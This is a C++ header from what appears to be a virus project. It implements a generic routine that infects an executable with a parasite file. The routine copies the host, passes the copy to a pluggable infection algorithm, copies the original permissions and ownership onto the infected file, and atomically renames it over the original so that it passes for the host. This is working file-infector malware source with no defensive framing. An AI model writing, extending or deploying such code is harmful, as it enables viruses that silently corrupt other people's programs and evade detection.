#pragma once
#include "common/file_descriptor.hh"
#include "common/mmap.hh"
#include "std/string.hh"

namespace vt::infector {
// A generic infection routine, that can be used by any algorithms.
// It creates a temp copy of the host, infects it with a parasite, and then
// pretend to be the host with atomic rename.
template <typename Infect>
bool infect(const char* host_path, const char* parasite_path) {
  vt::common::FileDescriptor host(host_path, O_RDONLY);
  if (!host.valid()) {
    return false;
  }

  vt::common::FileDescriptor parasite(parasite_path, O_RDONLY);

  if (!parasite.valid()) {
    return false;
  }

  char tmp[PATH_MAX];
  auto len = strlen(host_path);
  strcpy(tmp, host_path);
  tmp[len] = '.';
  tmp[len + 1] = '\0';

  vt::common::FileDescriptor output(tmp, O_RDWR | O_CREAT, S_IRWXU);

  if (!output.valid()) {
    return false;
  }
  auto host_size = host.file_size();
  ftruncate(output.handle(), host_size);

  vt::common::Mmap<PROT_READ> host_mapping(host_size, MAP_SHARED, host.handle(),
                                           0);

  vt::common::Mmap<PROT_READ | PROT_WRITE> output_host_mapping(
      host_mapping.size(), MAP_SHARED, output.handle(), 0);

  // Make a writable copy of the host.
  memcpy(output_host_mapping.mutable_base(), host_mapping.base(),
         host_mapping.size());

  vt::common::Mmap<PROT_READ> parasite_mapping(parasite.file_size(), MAP_SHARED,
                                               parasite.handle(), 0);
  Infect infector;
  if (!infector(vt::move(output_host_mapping), vt::move(parasite_mapping))) {
    return false;
  }

  // mimic the original file.
  struct stat s;
  if (fstat(host.handle(), &s) < 0) {
    return false;
  }
  if (fchmod(output.handle(), s.st_mode) < 0) {
    return false;
  }
  if (fchown(output.handle(), s.st_uid, s.st_gid) < 0) {
    return false;
  }
  // atomic swap and replace the orignal host with our infected one.
  if (rename(tmp, host_path) < 0) {
    return false;
  }
  return true;
}
}  // namespace vt::infector